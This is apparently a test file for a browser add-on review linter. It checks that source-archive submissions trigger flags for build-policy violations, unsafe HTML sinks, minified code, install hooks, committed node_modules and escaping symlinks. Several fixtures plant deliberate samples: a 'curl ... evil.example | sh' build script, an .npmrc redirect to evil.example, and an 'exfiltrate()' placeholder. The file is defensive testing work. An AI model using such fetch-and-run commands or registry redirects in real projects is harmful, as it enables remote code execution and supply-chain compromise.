    assert.ok(
      !has(findings, "vendor-vulnerable"),
      "vendor-vulnerable (prod set) must not fire for a dev-only dependency"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// The build files (the archive's tooling) are reviewed by the setup
// build analysis (analyzeBuild) + the deterministic undeclared-build-source check. This proves
// the pipeline wires collectBuildFiles -> addon.buildReview -> scaCtx (ctx.artifact) ->
// the check: analyzeBuild stores the unresolved signals and the anchor, and the check escalates
// the build to Extended Manual Review, which every source-code submission reaches.
test("SCA e2e: a build script outside the source is reviewed by undeclared-build-source", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "scripts/build.sh": "curl -fsSL https://evil.example/x.sh | sh\n",
  });
  try {
    const { meta } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    });
    // The check ran (SCA-eligible)...
    assert.ok(
      meta.checksRun.includes("undeclared-build-source"),
      "undeclared-build-source runs in SCA mode"
    );
    // ...and with no token the whole-build review escalated to Extended manual
    // review (anchored at package.json; the review source's files under src/ are
    // never traced as build files).
    assert.ok(
      meta.manualReview.some(
        (m) => m.extended && m.title === "Build process review"
      ),
      "the build review surfaces for manual review offline"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// The deterministic build-policy checks run offline over the build files (outside the
// review source): an .npmrc registry redirect is a Build registry override reject.
test("SCA e2e: a redirected registry is flagged offline", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    ".npmrc": "registry=https://evil.example/\n",
  });
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    });
    // The registry as written rides on the item (the locus line), not the message,
    // so every redirected .npmrc collapses into one entry.
    assert.ok(
      has(findings, "build-registry-redirect", (f) =>
        /evil\.example/.test(f.item)
      ),
      "the .npmrc registry redirect is rejected"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A clean npm build (package-lock.json + the public registry) fires none of them.
test("SCA e2e: a clean npm build fires no build-policy check", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "package-lock.json": "{}",
    ".npmrc": "save-exact=true\n", // a non-registry .npmrc is fine
  });
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    });
    assert.ok(!has(findings, "build-registry-redirect"));
    assert.ok(!has(findings, "committed-node-modules"));
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// Framework/TypeScript source (.ts/.tsx and .vue SFCs) is authored code the SCA
// review must analyze - a compiled XPI never contains it, so it is reviewed only
// here. Each file carries a real defect the code checks must catch, proving the
// source is parsed (TS/JSX) and, for the SFC, that its <script> and its v-html
// template binding are both scanned.
test("SCA e2e: TypeScript and Vue source is parsed and its defects are caught", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    // .ts with a type annotation: a fake API. If TS did not parse, the file would
    // fatal and no API usage would resolve - so unknown-api firing proves parsing.
    "src/api.ts": `const n: number = 1;\nbrowser.totallyFakeNamespace.doThing(n);\n`,
    // .tsx React component writing to an innerHTML sink.
    "src/Widget.tsx": `export const W = () => {\n  document.body.innerHTML = props.raw;\n  return <div/>;\n};\n`,
    // .vue SFC: a v-html template binding (an innerHTML-equivalent sink).
    "src/Comp.vue": `<script setup lang="ts">\nconst raw: string = get();\n</script>\n\n<template>\n  <div v-html="raw"></div>\n</template>\n`,
  });
  try {
    const { findings, meta } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    });
    // (1) The .ts file is parsed and API-resolved.
    assert.ok(
      hasItem(
        meta,
        "unknown-api",
        (m) => m.file === "src/api.ts" && /totallyFakeNamespace/.test(m.item)
      ),
      "the .ts source is parsed and its fake API is flagged"
    );
    // (2) The .tsx file's innerHTML sink is caught (JSX parsed, sink scanned).
    assert.ok(
      has(findings, "unsafe-html", (f) => f.file === "src/Widget.tsx"),
      "the .tsx innerHTML sink is flagged"
    );
    // (3) The .vue SFC's v-html template binding is caught as an innerHTML sink.
    assert.ok(
      has(findings, "unsafe-html", (f) => f.file === "src/Comp.vue"),
      "the .vue v-html binding is flagged as an HTML sink"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A minified file in the readable source is a hard reject in SCA: a source code
// archive's promise is readable source, so minified-code fires on it exactly as it
// would for a built XPI - it is never scanned as authored code.
test("SCA e2e: a minified file in the source is rejected by minified-code", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    // One long line >= 1024 bytes packing many statements -> minified, not a known library.
    "src/blob.min.js": `var s=0;${"s=s+1;".repeat(240)}`,
  });
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    });
    // The prefix is stripped by loadScaAddon, so the review file is "blob.min.js".
    assert.ok(
      has(findings, "minified-code", (f) => f.file === "src/blob.min.js"),
      "a minified source file is rejected by minified-code in SCA"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A package.json install lifecycle hook runs when the reviewer installs the declared
// dependencies, before the build - a supply-chain vector build-lifecycle-hook finds
// offline (no token). Only the command says whether it is legitimate, so the hook
// escalates for a reviewer to read rather than being asserted as a finding: it must
// reach the manual-review list AND stay out of the findings the upload filter reads.
test("SCA e2e: a package.json install hook escalates to a reviewer", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "package.json": JSON.stringify({
      name: "sca-e2e",
      version: "1.0.0",
      scripts: { postinstall: "node scripts/setup.js", build: "webpack" },
    }),
  });
  try {
    const { findings, meta } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    });
    assert.ok(
      meta.manualReview.some(
        (m) => m.title === "Build install hook" && /postinstall/.test(m.item)
      ),
      "the postinstall install hook reaches the reviewer"
    );
    assert.ok(
      !has(findings, "build-lifecycle-hook"),
      "and carries nothing into the findings the upload filter reads"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A committed built archive (.xpi/.zip) anywhere in --sca-root is a hard reject, caught at
// load like node_modules - so an archive in the build tree AND one inside the review source
// both fire, regardless of the source/build split.
test("SCA e2e: a committed build archive is rejected anywhere in --sca-root", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "conversations.xpi": "BUILT ARTIFACT AT ROOT", // build tree (outside src/)
    "src/vendor/lib.zip": "ARCHIVE IN THE REVIEW SOURCE", // inside the archive
  });
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    });
    assert.ok(
      has(
        findings,
        "committed-build-artifact",
        (f) => f.file === "conversations.xpi"
      ),
      "the committed .xpi in the build tree is flagged"
    );
    assert.ok(
      has(
        findings,
        "committed-build-artifact",
        (f) => f.file === "src/vendor/lib.zip"
      ),
      "an archive inside the review source is flagged too (loader spans all of --sca-root)"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A committed node_modules folder in --sca-root is a hard fail, and the ONLY check that
// may act on it: its contents are never read (loadAddon records the directory and does not
// walk it), so nothing else in the review can have an opinion about what is in there. The
// planted eval is the probe for that - it would be reported anywhere else in the
// submission, and here nothing may name it.
test("SCA e2e: a committed node_modules folder is rejected, and never inspected", async () => {
  const xpi = tmpDir(XPI_FILES);
  const src = tmpDir({
    ...SRC_FILES,
    "node_modules/left-pad/index.js":
      'function f() { return eval("1 + 1"); }\n',
  });
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    });
    assert.ok(
      has(findings, "committed-node-modules", (f) =>
        /node_modules/.test(f.message)
      ),
      "a committed node_modules folder is flagged"
    );
    assert.deepEqual(
      findings
        .filter((f) => /node_modules/.test(f.file ?? ""))
        .map((f) => f.ruleId),
      ["committed-node-modules"],
      "and nothing else in the review names anything under it"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A SYMLINK named node_modules is that same committed tree, so it is answered once, on the
// one axis that owns it. It is deliberately not a symlink record: the link check must not
// also speak, or one committed tree would draw two findings saying different things.
test("SCA e2e: a symlinked node_modules is answered once, as a committed tree", async () => {
  const xpi = tmpDir(XPI_FILES);
  const outside = tmpDir({
    "installed/left-pad/index.js": "module.exports = 1;\n",
  });
  const src = tmpDir(SRC_FILES);
  fs.symlinkSync(
    path.join(outside, "installed"),
    path.join(src, "node_modules"),
    "dir"
  );
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    });
    assert.deepEqual(
      findings.filter((f) => f.file === "node_modules").map((f) => f.ruleId),
      ["committed-node-modules"],
      "exactly one check answers it, and it is the one that owns installed trees"
    );
  } finally {
    [xpi, src, outside].forEach((d) =>
      fs.rmSync(d, { recursive: true, force: true })
    );
  }
});

// A symbolic link in --sca-root that leaves the submission is a hard fail: it is never
// followed, so whatever it names is outside everything the review reads and the build would compile code
// no review covered. A link WITHIN the submission stays ordinary layout - its target is
// walked under its own real path - so it is narrated and never reported.
test("SCA e2e: a symlink leaving --sca-root is rejected, one staying inside is not", async () => {
  const xpi = tmpDir(XPI_FILES);
  const outside = tmpDir({ "secret/payload.js": "exfiltrate();\n" });
  const src = tmpDir({ ...SRC_FILES, "src/inner/real.js": "const x = 1;\n" });
  fs.symlinkSync(
    path.join(outside, "secret"),
    path.join(src, "outward"),
    "dir"
  );
  fs.symlinkSync("src/inner", path.join(src, "intree"), "dir");
  try {
    const { findings } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    });
    assert.ok(
      has(
        findings,
        "sca-invalid-symlink",
        (f) =>
          f.file === "outward" && f.hint === "target outside the submission"
      ),
      "the escaping link is flagged, and its locus says why"
    );
    assert.ok(
      !has(findings, "sca-invalid-symlink", (f) => f.file === "intree"),
      "a link inside the submission is not a finding"
    );
  } finally {
    [xpi, src, outside].forEach((d) =>
      fs.rmSync(d, { recursive: true, force: true })
    );
  }
});

// The add-on half of the pair, in an SCA review: the built XPI holds links to the stricter
// standard. The shape the source archive may carry (a link INSIDE it) refuses the XPI at
// load, before either artifact is reviewed.
test("SCA e2e: a link inside the add-on refuses the XPI", async () => {
  const xpi = tmpDir({ ...XPI_FILES, "lib/real.js": "const y = 2;\n" });
  fs.symlinkSync("lib/real.js", path.join(xpi, "alias.js"));
  const src = tmpDir(SRC_FILES);
  fs.symlinkSync("src", path.join(src, "intree"), "dir");
  try {
    await assert.rejects(
      runPipeline({ addonPath: xpi, scaRoot: src, ...OFFLINE }),
      {
        message:
          "Invalid XPI: alias.js is a symbolic link (an add-on must contain regular files only).",
      }
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// A readable built XPI (no minified/obfuscated first-party code) makes a --sca-root
// submission a false SCA: the shipped add-on can be reviewed directly, so its source
// archive adds nothing. The review stays an SCA review, and the submission-shape checks
// say so: sca-xpi-fully-included-in-archive when the archive holds every shipped byte,
// sca-xpi-declares-vendoring when the XPI ships a declaration that belongs in the archive.
const READABLE_XPI = {
  "manifest.json": JSON.stringify({
    manifest_version: 3,
    name: "Readable XPI",
    version: "1.0",
    background: { scripts: ["background.js"] },
  }),
  "background.js": `console.log("readable shipped code");`,
};

// The two ways a submission says it did not need to be one, end to end. Neither changes the
// MODE: a source submission is always reviewed as a source submission, and the warning is
// only ever about the NEXT one.
test("SCA e2e: the two submission-shape checks fire independently", async () => {
  const xpi = tmpDir(READABLE_XPI);
  const base = {
    "package.json": JSON.stringify({ name: "tr", version: "1.0.0" }),
    // A source archive owes a lock whatever its package.json declares - without one this
    // would test the lock rule rather than the question it is about.
    "package-lock.json": JSON.stringify({
      lockfileVersion: 3,
      packages: { "": {} },
    }),
    "src/manifest.json": READABLE_XPI["manifest.json"],
    // Byte-identical to the shipped script. A lookalike literal would silently fail this.
    "src/background.js": READABLE_XPI["background.js"],
  };
  const twinned = tmpDir(base);
  // The same archive, except the shipped script was BUILT from something else: nothing in
  // the archive matches its bytes, so the comparison finds no twin.
  const built = tmpDir({
    ...base,
    "src/background.js": `console.log("pre-build source");`,
  });
  // Built bytes again, but this time the XPI carries a package.json of its own - which in a
  // source submission belongs in the archive. That alone warns, twin or no twin.
  const xpiWithDeclaration = tmpDir({
    ...READABLE_XPI,
    "background.js": `console.log("built output");`,
    "package.json": JSON.stringify({ name: "shipped", version: "1.0.0" }),
  });
  try {
    const a = await runPipeline({
      addonPath: xpi,
      scaRoot: twinned,
      ...OFFLINE,
    });
    assert.equal(a.mode, REVIEW_MODE.SCA, "the review is never re-routed");
    assert.ok(
      has(a.findings, "sca-xpi-fully-included-in-archive"),
      "every shipped byte is readable in the archive"
    );
    assert.ok(
      !has(a.findings, "sca-xpi-declares-vendoring"),
      "the declarations are in the ARCHIVE, which is where they belong"
    );

    const b = await runPipeline({ addonPath: xpi, scaRoot: built, ...OFFLINE });
    assert.equal(b.mode, REVIEW_MODE.SCA, "still a source review, as always");
    assert.ok(
      !has(b.findings, "sca-xpi-fully-included-in-archive"),
      "a shipped file that was built has no twin, and the archive is needed"
    );

    const c = await runPipeline({
      addonPath: xpiWithDeclaration,
      scaRoot: built,
      ...OFFLINE,
    });
    assert.ok(
      has(c.findings, "sca-xpi-declares-vendoring"),
      "vendoring information in the XPI warns on its own"
    );
    assert.ok(
      !has(c.findings, "sca-xpi-fully-included-in-archive"),
      "its shipped script was built, so the archive does not hold the XPI"
    );
  } finally {
    [xpi, twinned, built, xpiWithDeclaration].forEach((d) =>
      fs.rmSync(d, { recursive: true, force: true })
    );
  }
});

test("SCA e2e: an archive holding the whole XPI is reported, and is still reviewed as SCA", async () => {
  const xpi = tmpDir(READABLE_XPI);
  // Every shipped file is byte-identical here, so the archive holds the whole XPI and the
  // check fires. The source ALSO carries a fake API in a file the XPI lacks: unknown-api
  // catching it is what proves the source was reviewed anyway - this does not narrow it.
  const src = tmpDir({
    "package.json": JSON.stringify({
      name: "dg",
      version: "1.0.0",
      scripts: { build: "cp -r node_modules/lib dist" },
    }),
    // A source archive owes a lock whatever its package.json declares - without one this
    // would report the lock rule instead of the rule the test is about.
    "package-lock.json": JSON.stringify({
      lockfileVersion: 3,
      packages: { "": {} },
    }),
    "background.js": READABLE_XPI["background.js"],
    "manifest.json": READABLE_XPI["manifest.json"],
    "only-in-source.js": `browser.totallyFakeNamespace.doThing();\n`,
  });
  try {
    const result = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    });
    const { findings, mode } = result;
    assert.equal(
      mode,
      REVIEW_MODE.SCA,
      "this never re-routes the review - an SCA submission stays SCA"
    );
    assert.ok(
      has(findings, "sca-xpi-fully-included-in-archive"),
      "the archive holding every shipped byte is reported"
    );
    assert.ok(
      hasItem(result.meta, "unknown-api", (m) =>
        /totallyFakeNamespace/.test(m.item ?? "")
      ),
      "and the source IS still reviewed - that is the point of not downgrading"
    );
    // Lock the rendered entry: it must explain the cost of the source-archive route,
    // and it must carry NO locus line - every shipped file is the subject, so naming one
    // would name the whole XPI.
    const body = formatText(result);
    // Located by the REGISTRY's own text, not by a phrase copied here: the wording is the
    // registry's to change, and a copy of it only ever breaks. What this pins is that the
    // entry renders at all, and that it still presses the case - not how it is worded.
    const advice = loadRegistry()
      .checkEntry("sca-xpi-fully-included-in-archive")
      .response.trim();
    // The response is more than one line (it ends in a Read more:), and each of its lines
    // renders as one, so the locus would sit after the LAST of them.
    const adviceLines = advice.split("\n");
    assert.match(
      advice,
      /longer/i,
      "the advice presses the case: the source-archive route costs time"
    );
    const lines = body.split("\n");
    const entry = lines.findIndex((l) => l.includes(adviceLines[0]));
    assert.ok(entry >= 0, "the entry is rendered");
    assert.equal(
      lines[entry + adviceLines.length].trim(),
      "",
      "the entry is followed by a blank line, not a locus"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

test("SCA e2e: a minified-XPI submission stays in SCA mode (a legitimate SCA)", async () => {
  const xpi = tmpDir(XPI_FILES); // background.js ships minified -> the XPI is not reviewable as-is
  const src = tmpDir(SRC_FILES);
  try {
    const { findings, mode } = await runPipeline({
      addonPath: xpi,
      scaRoot: src,
      ...OFFLINE,
    });
    assert.equal(
      mode,
      REVIEW_MODE.SCA,
      "a minified XPI keeps the source-code-archive review"
    );
    assert.ok(
      !has(findings, "sca-xpi-fully-included-in-archive"),
      "no XPI-only advice for a legitimate SCA"
    );
  } finally {
    [xpi, src].forEach((d) => fs.rmSync(d, { recursive: true, force: true }));
  }
});

// The review's three reviewer-facing files land BESIDE the submission, and this run writes
// none of them - the description and build report are the agents', the report a later
// pass's. So the folder is refused before the review is built, or the failure lands after
// it is finished. What was there before probed the temp directory instead: the one place
// that cannot fail, and not where any of the three goes.
//
// `access(W_OK)` is bypassed for root, so as root these assert nothing rather than
// something wrong.
const asRoot = process.getuid?.() === 0;

/** An add-on in a SUBFOLDER, so its parent is a folder the test can make unwritable.
 *  tmpDir puts its directory straight under os.tmpdir(), which is not ours to chmod. */
function nestedAddon() {
  const parent = fs.mkdtempSync(path.join(os.tmpdir(), "wrr-ro-"));
  const addon = path.join(parent, "addon");
  fs.mkdirSync(addon);
  for (const [name, content] of Object.entries(XPI_FILES)) {
    const dest = path.join(addon, name);
    fs.mkdirSync(path.dirname(dest), { recursive: true });
    fs.writeFileSync(dest, content);
  }
  return { parent, addon };
}

test(
  "a review that names files beside the submission refuses an unwritable folder",
  {
    skip: asRoot ? "access(W_OK) is bypassed for root" : false,
  },
  async () => {
    const { parent, addon } = nestedAddon();
    try {
      fs.chmodSync(parent, 0o500);
      await assert.rejects(
        () => runPipeline({ addonPath: addon, llmReview: true, ...OFFLINE }),
        (err) => {
          assert.match(err.message, /cannot write there/);
          assert.ok(err.message.includes(parent), "names the folder");
          return true;
        }
      );
    } finally {
      // Before the cleanup, or it cannot remove what it made.
      fs.chmodSync(parent, 0o700);
      fs.rmSync(parent, { recursive: true, force: true });
    }
  }
);

// The other half, and the one that says the check did not over-reach: an ordinary review
// prints its report and writes nothing beside the submission, so an unwritable folder is
// none of its business.
test(
  "an ordinary review still runs in a folder it cannot write to",
  {
    skip: asRoot ? "access(W_OK) is bypassed for root" : false,
  },
  async () => {
    const { parent, addon } = nestedAddon();
    try {
      fs.chmodSync(parent, 0o500);
      const { meta, findings } = await runPipeline({
        addonPath: addon,
        ...OFFLINE,
      });
      assert.equal(meta.prompting, undefined);
      assert.equal(meta.reportFile, undefined); // nothing named, so nothing to write
      assert.ok(Array.isArray(findings), "the review completed");
    } finally {
      fs.chmodSync(parent, 0o700);
      fs.rmSync(parent, { recursive: true, force: true });
    }
  }
);

// The five files a review names share one stem, and it is read off the PATH the run was
// given - never off the manifest. The manifest's name is submission data of any shape, and
// the one thing the stem is for is being recognised by whoever opens the file, which the
// name of the thing they downloaded does anyway.
test("the review's files are named after the submission, whatever it was given", () => {
  const stem = (p) => path.basename(reviewFilePaths(p).report, ".report.md");
  // A packed submission, and the folder an earlier run unpacked it into - both spellings,
  // because a reviewer re-reviewing points the linter at one of those and still expects to
  // recognise the name. The unpacked-from-the-start case has no suffix to lose.
  const shapes = [
    "/dl/foo.xpi",
    "/dl/foo",
    `/dl/foo.xpi.extracted`,
    `/dl/foo.xpi.extracted-${pathStamp()}`,
  ];
  for (const p of shapes) {
    assert.match(stem(p), /^foo-\d{4}-\d{2}-\d{2}T[\d-]+Z$/, p);
  }
  // A stamp is matched by its shape, so a folder somebody named that way keeps its name.
  assert.equal(
    submissionLeaf("/dl/foo.xpi.extracted-notes"),
    "foo.xpi.extracted-notes"
  );
  // Escaped, not because a leaf could escape a directory - it cannot - but because an
  // ordinary name like this one would otherwise upset a shell.
  assert.match(stem("/dl/My Add-on 1.0.xpi"), /^My_Add-on_1\.0-/);
  // One stem for all five, which is what a later pass checks rather than trusts.
  const files = reviewFilePaths("/dl/foo.xpi");
  const base = path.basename(files.review, ".review.json");
  for (const [key, suffix] of [
    ["summary", ".summary.md"],
    ["build", ".build.md"],
    ["report", ".report.md"],
  ]) {
    assert.equal(path.basename(files[key]), `${base}${suffix}`, key);
  }
});

// The regression this replaced a crash with. The stem used to come from the manifest, so a
// `name` of the wrong type threw while the files were being named - after the review had
// finished, and after mistyped-manifest-value had already found the bad value. The review
// and the finding that explains it were both discarded.
test("a manifest whose name and version are not strings still reviews", async () => {
  const parent = fs.mkdtempSync(path.join(os.tmpdir(), "wrr-badname-"));
  const addon = path.join(parent, "brokenname");
  fs.mkdirSync(addon);
  fs.writeFileSync(
    path.join(addon, "manifest.json"),
    JSON.stringify({
      manifest_version: 3,
      name: { "en-US": "authored as a map by mistake" },
      version: { a: 1 },
      background: { scripts: ["bg.js"] },
    })
  );
  fs.writeFileSync(path.join(addon, "bg.js"), "1;\n");
  try {
    const { meta, findings } = await runPipeline({
      addonPath: addon,
      llmReview: true,
      ...OFFLINE,
    });
    // Named from the folder, so neither value was ever read for it.
    assert.match(path.basename(meta.reportFile), /^brokenname-/);
    // And the findings survive - which is the whole point: they existed before too, and
    // were thrown away with the crash.
    assert.ok(
      findings.some((f) => f.ruleId === "mistyped-manifest-value"),
      "the bad values are reported to the developer"
    );
  } finally {
    fs.rmSync(parent, { recursive: true, force: true });
  }
});
